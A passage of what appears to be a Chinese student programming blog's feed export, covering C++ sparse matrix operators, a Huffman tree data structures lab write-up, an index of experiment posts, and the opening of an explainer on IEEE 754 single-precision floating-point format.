data[i].value + b.data[j].value;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        add.tu++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; tu) &#123;</span><br><span class="line">        add.data[add.tu].row = data[i].row;</span><br><span class="line">        add.data[add.tu].col = data[i].col;</span><br><span class="line">        add.data[add.tu].value = data[i].value;</span><br><span class="line">        i++;</span><br><span class="line">        add.tu++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; b.tu) &#123;</span><br><span class="line">        add.data[add.tu].row = b.data[j].row;</span><br><span class="line">        add.data[add.tu].col = b.data[j].col;</span><br><span class="line">        add.data[add.tu].value = b.data[j].value;</span><br><span class="line">        j++;</span><br><span class="line">        add.tu++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> add;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-重载减法运算符"><a href="#0x06-重载减法运算符" class="headerlink" title="0x06 重载减法运算符"></a>0x06 重载减法运算符</h1><p>与加法类似。</p>
<h1 id="0x07-重载乘法运算符"><a href="#0x07-重载乘法运算符" class="headerlink" title="0x07 重载乘法运算符"></a>0x07 重载乘法运算符</h1><p>另构造一积矩阵来存储两矩阵之积。</p>
<p>两矩阵可乘的前提是左矩阵的列数等于右矩阵的行数，应该先作判断。</p>
<p>矩阵的乘法即左矩阵的行与右矩阵的列对应相乘再相加，将右矩阵视为数组以便于运算。</p>
<p>以左矩阵为基准，将右矩阵的各个属性分别存储以便于进一步运算，即重排。包括右矩阵的每行非零元素个数以及每行第一个非零元素在数组中对应的位置。</p>
<p>按左矩阵的行进行运算，每计算完一行将结果存入一个数组中，再赋值给积矩阵。</p>
<p>最后释放<code>new</code>所分配的内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SPMatrix SPMatrix::<span class="keyword">operator</span>*(<span class="keyword">const</span> SPMatrix&amp; b)&#123;</span><br><span class="line">    <span class="function">SPMatrix <span class="title">mul</span><span class="params">(mu, nu)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (b.mu != nu)</span><br><span class="line">        <span class="keyword">return</span> mul;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span>* tuOfEachBRow = <span class="keyword">new</span> <span class="keyword">int</span>[b.mu];</span><br><span class="line">    <span class="keyword">int</span>* firstIndexOfEachBRow = <span class="keyword">new</span> <span class="keyword">int</span>[b.mu + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span>* rowPOfResult = <span class="keyword">new</span> <span class="keyword">int</span>[b.nu];</span><br><span class="line">    <span class="keyword">int</span> aLoc, aRowLoc, aColLoc, bColLoc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.mu; i++)</span><br><span class="line">        tuOfEachBRow[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.tu; i++)</span><br><span class="line">        tuOfEachBRow[b.data[i].row]++;</span><br><span class="line">    firstIndexOfEachBRow[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; b.mu; i++)</span><br><span class="line">        firstIndexOfEachBRow[i] = firstIndexOfEachBRow[i - <span class="number">1</span>] + tuOfEachBRow[i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    aLoc = <span class="number">0</span>;</span><br><span class="line">    mul.tu = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (aLoc &lt; tu) &#123;</span><br><span class="line">        aRowLoc = data[aLoc].row;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.nu; i++)</span><br><span class="line">            rowPOfResult[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (aLoc &lt; tu &amp;&amp; data[aLoc].row == aRowLoc) &#123;</span><br><span class="line">            aColLoc = data[aLoc].col;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = firstIndexOfEachBRow[aColLoc]; i &lt; firstIndexOfEachBRow[aColLoc + <span class="number">1</span>]; i++) &#123;</span><br><span class="line">                bColLoc = b.data[i].col;</span><br><span class="line">                rowPOfResult[bColLoc] += data[aLoc].value * b.data[i].value;</span><br><span class="line">            &#125;</span><br><span class="line">            aLoc++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.nu; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (rowPOfResult[i]) &#123;</span><br><span class="line">                mul.tu++;</span><br><span class="line">                mul.data[mul.tu].row = aRowLoc;</span><br><span class="line">                mul.data[mul.tu].value = rowPOfResult[i];</span><br><span class="line">                mul.data[mul.tu].col = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mul.mu = mu;</span><br><span class="line">    mul.nu = b.nu;</span><br><span class="line">    mul.tu++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] tuOfEachBRow;</span><br><span class="line">    <span class="keyword">delete</span>[] firstIndexOfEachBRow;</span><br><span class="line">    <span class="keyword">delete</span>[] rowPOfResult; </span><br><span class="line">    <span class="keyword">return</span> mul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x08-析构函数"><a href="#0x08-析构函数" class="headerlink" title="0x08 析构函数"></a>0x08 析构函数</h1><p>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SPMatrix::~SPMatrix()&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x…"><a href="#0x…" class="headerlink" title="0x…"></a>0x…</h1><p>如果你发现了我的错误或者有更好的解决方案，欢迎一起交流。</p>
]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「哈夫曼树」？</title>
    <url>/Data-Structures-Experiment-9/</url>
    <content><![CDATA[<p>Data Structures Experiment #9 - 完成哈夫曼树类的私有属性以及接口，实现哈夫曼树类。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>在<code>HuffmanTree</code>类中给出了四个函数:</p>
<ul>
<li><code>HuffmanTree(const char* str);</code><br>将<code>str</code>构建为哈夫曼树，要求权值较小的节点放在左子，左子编号为<code>0</code>。例如<code>&quot;aaaabbc&quot;</code>的树生成如下。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/HufTree.png" alt="HufTree"></li>
<li><code>char* getencode(char c);</code><br>获取字符<code>c</code>的编码。将结果以<code>char*</code>的形式返回。上例中的 <code>getencode(‘c’)</code>返回结果为<code>00</code>。</li>
<li><code>int getWPL();</code><br>返回哈夫曼树的WPL。</li>
<li><code>~HuffmanTree();</code><br>哈夫曼树的析构函数。</li>
</ul>
</blockquote>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>定义Huffman树结点类型<code>HTNode</code>，包括结点字符、权、父结点、左子、右子、编码等。<br>存储叶结点个数<code>leaves</code>和结点个数<code>nodes</code>。<br>存储结点转换后的编码。</p>
<p>最终将建成的Huffman树存储在<code>HTNode</code>型数组中，前<code>leaves</code>项存储叶结点，后<code>nodes - leaves</code>项存储根结点。</p>
<p>由于父结点、左子、右子可以用数组下标指向，故声明为<code>int</code>型。</p>
<blockquote>
<p>为便于操作字符串，将结点编码声明为<code>string</code>型，需要包含<code>&lt;string&gt;</code>头文件。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">HTNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">char</span> data;</span><br><span class="line">        <span class="keyword">int</span> weight;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> code;</span><br><span class="line">        <span class="keyword">int</span> lChild, rChild, parent;</span><br><span class="line">    &#125;;</span><br><span class="line">    HTNode* HufTree;</span><br><span class="line">    <span class="keyword">int</span> leaves;</span><br><span class="line">    <span class="keyword">int</span> nodes;</span><br><span class="line">    <span class="keyword">char</span>* encode;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>由于构造Huffman树的步骤较多，为便于理解，我将构造函数分为<code>Reading</code>-&gt;<code>Initializing</code>-&gt;<code>Combining</code>-&gt;<code>Encoding</code>-&gt;<code>Freeing</code>五个阶段。</p>
<h2 id="Reading"><a href="#Reading" class="headerlink" title="Reading"></a>Reading</h2><p>此阶段读取<code>char*</code>型的<code>str</code>，并存储其中的字符和权。</p>
<p>应考虑<code>str</code>中字符未必连续，故算法进行了改进：先读取字符，再读取权。<em>（此处感谢@刘宇婷同学的指正）</em></p>
<p>计算权之前，需要对权数组初始化，即全部赋0。若忽略此操作，虽然macOS与Linux均可正常运行，但Windows下会出现错误，因为未对数组初始化导致数组各项存放的值均为“垃圾值”，不可确定。这与其他变量的声明类似，声明后不初始化不是好的编程习惯。<em>（此处感谢@刘宇婷同学的指正）</em></p>
<blockquote>
<p>操作C字符串需要包含<code>&lt;cstring&gt;</code>头文件。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">char</span>* ch = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(str)];</span><br><span class="line"><span class="keyword">int</span>* weigh = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="built_in">strlen</span>(str)];</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line">ch[<span class="number">0</span>] = str[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">    <span class="keyword">bool</span> exist = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; size + <span class="number">1</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == ch[j])</span><br><span class="line">            exist = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!exist)</span><br><span class="line">        ch[++size] = str[i];        </span><br><span class="line">&#125;</span><br><span class="line">leaves = size + <span class="number">1</span>;</span><br><span class="line">nodes = <span class="number">2</span> * leaves - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; leaves; i++) &#123;</span><br><span class="line">    weigh[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str); j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch[i] == str[j])</span><br><span class="line">            weigh[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Initializing"><a href="#Initializing" class="headerlink" title="Initializing"></a>Initializing</h2><p>此阶段用上一阶段存储的字符数组和权数组来初始化Huffman数组的前部分（叶结点），其他赋值为<code>-1</code>便于进行判断。</p>
<p><code>char*</code>型结点编码<code>encode</code>在此处定义，便于<a href="#encode">以后</a>使用。</p>
<blockquote>
<p>此处若<code>encode</code>未被定义，则会出现报错<code>Segmentation fault: 11</code>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HufTree = <span class="keyword">new</span> HTNode[nodes];</span><br><span class="line">encode = <span class="keyword">new</span> <span class="keyword">char</span>[nodes];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nodes; i++) &#123;</span><br><span class="line">    HufTree[i].weight = <span class="number">0</span>;</span><br><span class="line">    HufTree[i].parent = <span class="number">-1</span>;</span><br><span class="line">    HufTree[i].lChild = <span class="number">-1</span>;</span><br><span class="line">    HufTree[i].rChild = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; leaves) &#123;</span><br><span class="line">        HufTree[i].data = ch[i];</span><br><span class="line">        HufTree[i].weight = weigh[i];</span><br><span class="line">        HufTree[i].code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Combining"><a href="#Combining" class="headerlink" title="Combining"></a>Combining</h2><p>此阶段将上一阶段初始化的Huffman数组进行合并，构建Huffman树。</p>
<p>合并时需要寻找权最小的两个结点，故另构造<code>Searching</code>函数，此函数<strong>须写在构造函数外部</strong>。</p>
<h3 id="Searching"><a href="#Searching" class="headerlink" title="Searching"></a>Searching</h3><p>由于需要找到权最小的两个结点，可以直接赋值给参数，使用引用传递。</p>
<p>此处应确保最小权为正，因为权为0即结点未初始化，权为负即结点被<a href="#shield">屏蔽</a>。</p>
<p>初始化<code>min</code>和<code>_min</code>时应确保其为正，不可以直接取第0位，可能会导致判断出现错误。<em>（此处感谢@刘宇婷同学的指正）</em></p>
<blockquote>
<p>不要忘记初始化后<code>break</code>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HuffmanTree::mini</span><span class="params">(<span class="keyword">int</span>&amp; left, <span class="keyword">int</span>&amp; right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min, _min;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nodes; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (HufTree[i].weight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            min = _min = HufTree[i].weight;</span><br><span class="line">            left = right = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nodes; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (HufTree[i].weight &lt; min &amp;&amp; HufTree[i].weight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            min = HufTree[i].weight;</span><br><span class="line">            left = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nodes; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (HufTree[i].weight &lt; _min &amp;&amp; HufTree[i].weight &gt; min &amp;&amp; HufTree[i].weight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            _min = HufTree[i].weight;</span><br><span class="line">            right = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Combining-1"><a href="#Combining-1" class="headerlink" title="Combining"></a>Combining</h3><p>寻找权最小的两个结点，进行合并。</p>
<p>将所得父结点存储在Huffman数组后部分（根结点），将后部分进行初始化。</p>
<p>合并之后需要将两个子结点<span id = "shield"><strong>屏蔽</strong></span>，不会出现在以后的<code>Searching</code>中。</p>
<blockquote>
<p>此处若不处理已经合并的结点，则下次寻找时仍会返回此结点而出现错误。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = leaves; i &lt; nodes; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> min1, min2;</span><br><span class="line">    mini(min1, min2);</span><br><span class="line">    </span><br><span class="line">    HufTree[min1].parent = HufTree[min2].parent = i;</span><br><span class="line">    HufTree[i].lChild = min1;</span><br><span class="line">    HufTree[i].rChild = min2;</span><br><span class="line">    </span><br><span class="line">    HufTree[i].weight = HufTree[min1].weight + HufTree[min2].weight;</span><br><span class="line">    </span><br><span class="line">    HufTree[min1].weight = -HufTree[min1].weight;</span><br><span class="line">    HufTree[min2].weight = -HufTree[min2].weight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h2><p>此阶段将上一阶段构建完成的Huffman树的叶结点进行编码，通过寻找每一个叶结点的父结点，再寻找该父结点的父结点……以此类推，每次追溯父结点时判断子结点是父结点的左子还是右子，编码字符串相应地添加<code>0</code>或<code>1</code>。最后将所得字符串反转，即为编码。</p>
<blockquote>
<p>为实现字符串的反转，需要<code>#include &lt;algorithm&gt;</code>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; leaves; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> parent_index = HufTree[i].parent;</span><br><span class="line">    <span class="keyword">int</span> child_index = i;</span><br><span class="line">    <span class="keyword">while</span> (parent_index != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (child_index == HufTree[parent_index].lChild)</span><br><span class="line">            HufTree[i].code += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (child_index == HufTree[parent_index].rChild)</span><br><span class="line">            HufTree[i].code += <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        child_index = parent_index;</span><br><span class="line">        parent_index = HufTree[parent_index].parent;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(HufTree[i].code.begin(), HufTree[i].code.end());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Freeing"><a href="#Freeing" class="headerlink" title="Freeing"></a>Freeing</h2><p>释放字符数组和权数组内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span>[] ch;</span><br><span class="line"><span class="keyword">delete</span>[] weigh;</span><br></pre></td></tr></table></figure>
<p><em>至此，构造函数已经完成。</em></p>
<h1 id="0x02-Get-Encode"><a href="#0x02-Get-Encode" class="headerlink" title="0x02 Get Encode"></a>0x02 Get Encode</h1><p>遍历叶结点，找到<code>c</code>字符对应的结点，将其编码转换为<code>char*</code>型，存储于构造函数的<span id = "encode"><code>encode</code></span>中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">HuffmanTree::getcode</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; leaves; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (HufTree[i].data == c) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; HufTree[i].code.length(); j++)</span><br><span class="line">                encode[j] = HufTree[i].code[j];</span><br><span class="line">            encode[HufTree[i].code.length()] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> encode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-Get-WPL"><a href="#0x03-Get-WPL" class="headerlink" title="0x03 Get WPL"></a>0x03 Get WPL</h1><p>WPL：Weighted Path Length（带权路径长度），计算公式如下。$$WPL =\sum_{k=1}^nw_kl_k$$</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">HuffmanTree::getWPL</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> WPL;</span><br><span class="line">    WPL = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; leaves; i++)</span><br><span class="line">        WPL += -HufTree[i].weight * HufTree[i].code.length();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> WPL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-析构函数"><a href="#0x04-析构函数" class="headerlink" title="0x04 析构函数"></a>0x04 析构函数</h1><p>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HuffmanTree::~HuffmanTree() &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] HufTree;</span><br><span class="line">    <span class="keyword">delete</span>[] encode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>「还不会」的「数据结构实验」</title>
    <url>/Data-Structures-Experiments/</url>
    <content><![CDATA[<p>Data Structures Experiments - 目录</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<p>下面是数据结构实验的目录，点击链接即可跳转，公众号后台回复“数据结构实验”即可获取全部实验材料。</p>
<ol>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-1/">Data Structures Experiment #1</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-2/">Data Structures Experiment #2</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-3/">Data Structures Experiment #3</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-4/">Data Structures Experiment #4</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-5/">Data Structures Experiment #5</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-6/">Data Structures Experiment #6</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-7/">Data Structures Experiment #7</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-8/">Data Structures Experiment #8</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-9/">Data Structures Experiment #9</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-10/">Data Structures Experiment #10</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-11/">Data Structures Experiment #11</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-12/">Data Structures Experiment #12</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-13/">Data Structures Experiment #13</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-14/">Data Structures Experiment #14</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-15/">Data Structures Experiment #15</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-16/">Data Structures Experiment #16</a></li>
<li><a href="https://www.superpung.xyz/Data-Structures-Experiment-17/">Data Structures Experiment #17</a></li>
</ol>
]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是「单精度浮点数」？</title>
    <url>/IEEE754-float/</url>
    <content><![CDATA[<p>IEEE 754: Single-precision floating-point format - 关于单精度浮点数编码的简介</p>
<a id="more"></a>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p><em>参考文献</em><br>维基百科编者. IEEE 754[G/OL]. 维基百科, 2020(20200403)[2020-04-03]. -{R|<a href="https://zh.wikipedia.org/w/index.php?title=IEEE_754&amp;oldid=58965505%7D-">https://zh.wikipedia.org/w/index.php?title=IEEE_754&amp;oldid=58965505}-</a>.<br>维基百科编者. 單精度浮點數[G/OL]. 维基百科, 2019(20190714)[2019-07-14]. -{R|<a href="https://zh.wikipedia.org/w/index.php?title=%E5%96%AE%E7%B2%BE%E5%BA%A6%E6%B5%AE%E9%BB%9E%E6%95%B8&amp;oldid=55208237%7D-">https://zh.wikipedia.org/w/index.php?title=%E5%96%AE%E7%B2%BE%E5%BA%A6%E6%B5%AE%E9%BB%9E%E6%95%B8&amp;oldid=55208237}-</a>.</p>
</blockquote>
<h1 id="什么是IEEE-754？"><a href="#什么是IEEE-754？" class="headerlink" title="什么是IEEE 754？"></a>什么是IEEE 754？</h1><p><strong>IEEE二进制浮点数算术标准（IEEE 754）</strong>是20世纪80年代以来最广泛使用的浮点数运算标准，为许多CPU与浮点运算器所采用。这个标准定义了表示浮点数的格式（包括负零<code>-0</code>）与反常值（denormal number），一些特殊数值（（无穷（<code>Inf</code>）与非数值（<code>NaN</code>）），以及这些数值的“浮点数运算符”；它也指明了四种数值舍入规则和五种例外状况（包括例外发生的时机与处理方式）。</p>
<p>IEEE 754规定了四种表示浮点数值的方式：单精确度（32位）、双精确度（64位）、延伸单精确度（43比特以上，很少使用）与延伸双精确度（79比特以上，通常以80位实现）。只有32位模式有强制要求，其他都是选择性的。大部分编程语言都提供了IEEE浮点数格式与算术，但有些将其列为非必需的。例如，IEEE 754问世之前就有的C语言，现在包括了IEEE算术，但不算作强制要求（C语言的<code>float</code>通常是指IEEE单精确度，而<code>double</code>是指双精确度）。</p>
<h1 id="浮点数是怎样构成的？"><a href="#浮点数是怎样构成的？" class="headerlink" title="浮点数是怎样构成的？"></a>浮点数是怎样构成的？</h1><p>一个浮点数（Value）其实可以这样表示：$$Value=sign\times exponent\times fraction$$<br>也就是说，浮点数的实际值，等于符号位（sign bit）乘以指数偏移值（exponent bias）再乘以分数值（fraction）。</p>
<blockquote>
<p>本文表示比特的约定：<br>把<code>W</code>个比特（bit）的数据，从内存地址低端到高端，以<code>0</code>到<code>W−1</code>编码。通常将内存地址低端的比特写在最右边，称作<strong>最低有效位（Least Significant Bit, LSB）</strong>，代表最小的比特，改变时<strong>对整体数值影响最小</strong>的比特。声明这一点的必要性在于X86体系架构是<strong>小端序</strong>的数据存储。<br>对于十进制整数$N$，必要时表示为$N_{10}$以与二进制的数的表示$N_2$相区分。<br>对于一个数，其二进制科学计数法表示下的指数的值，下文称之为指数的实际值；而根据IEEE 754标准对指数部分的编码的值，称之为浮点数表示法指数域的编码值。</p>
</blockquote>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/490px-General_floating_point_frac.svg.png" alt="整体呈现"><br>二进制浮点数以符号数值表示法的格式存储——最高有效位被指定为<strong>符号位（sign bit）</strong>；“指数部分”，即次高有效的e个比特，存储<strong>指数部分</strong>；最后剩下的f个低有效位的比特，存储“有效数”（significand）的<strong>小数部分</strong>（在非规约形式下整数部分默认为0，其他情况下一律默认为1）。</p>
<h2 id="指数偏移值"><a href="#指数偏移值" class="headerlink" title="指数偏移值"></a>指数偏移值</h2><p><strong>指数偏移值（exponent bias）</strong>，即浮点数表示法中指数域的编码值，等于指数的实际值加上某个固定的值，IEEE 754标准规定该固定值为$2^{e-1}-1$，其中的$e$为存储指数的比特的长度。</p>
<p>以单精度浮点数为例，它的指数域是8个比特，固定偏移值是$2^{8-1}-1=128-1=127$。此为有号数的表示方式，单精度浮点数的指数部分实际取值是从-126到127（-127和128被用作特殊值处理，见下方“非规约形式的浮点数”和“特殊值”）。例如指数实际值为$17_{10}$，在单精度浮点数中的指数域编码值为$144_{10}$，即$144_{10}=17_{10}+127_{10}$。</p>
<p>采用指数的实际值加上固定的偏移值的办法表示浮点数的指数，好处是可以用长度为$e$个比特的无符号整数来表示所有的指数取值，这使得两个浮点数的指数大小的比较更为容易，实际上可以按照字典序比较两个浮点表示的大小。</p>
<p>这种移码表示的指数部分，中文称作阶码。</p>
<h2 id="规约形式的浮点数"><a href="#规约形式的浮点数" class="headerlink" title="规约形式的浮点数"></a>规约形式的浮点数</h2><p>如果浮点数中指数部分的编码值在$0&lt; exponent\leq 2^{e}-2$之间，且在科学表示法的表示方式下，分数 (fraction) 部分最高有效位（即整数字）是$1$，那么这个浮点数将被称为<strong>规约形式的浮点数</strong>。“规约”是指用唯一确定的浮点形式去表示一个值。</p>
<p>由于这种表示下的尾数有一位隐含的二进制有效数字，为了与二进制科学计数法的尾数（mantissa）相区别，IEEE754称之为<strong>有效数（significant）</strong>。</p>
<p>举例来说，双精度 (64-bit) 的规约形式浮点数在指数偏移值的值域为$00000000001$（11-bit）到$11111111110$，在分数部分则是$000…..000$到$111…..111$（52-bit）。</p>
<h2 id="非规约形式的浮点数"><a href="#非规约形式的浮点数" class="headerlink" title="非规约形式的浮点数"></a>非规约形式的浮点数</h2><p>如果浮点数的指数部分的编码值是0，分数部分非零，那么这个浮点数将被称为<strong>非规约形式的浮点数</strong>。一般是某个数字相当接近零时才会使用非规约型式来表示。 IEEE 754标准规定：<strong>非规约形式的浮点数的指数偏移值比规约形式的浮点数的指数偏移值小1</strong>。例如，最小的规约形式的单精度浮点数的指数部分编码值为1，指数的实际值为-126；而非规约的单精度浮点数的指数域编码值为0，对应的指数实际值也是-126而不是-127。实际上非规约形式的浮点数仍然是有效可以使用的，只是它们的绝对值已经小于所有的规约浮点数的绝对值；即所有的非规约浮点数比规约浮点数更接近0。规约浮点数的尾数大于等于1且小于2，而非规约浮点数的尾数小于1且大于0。</p>
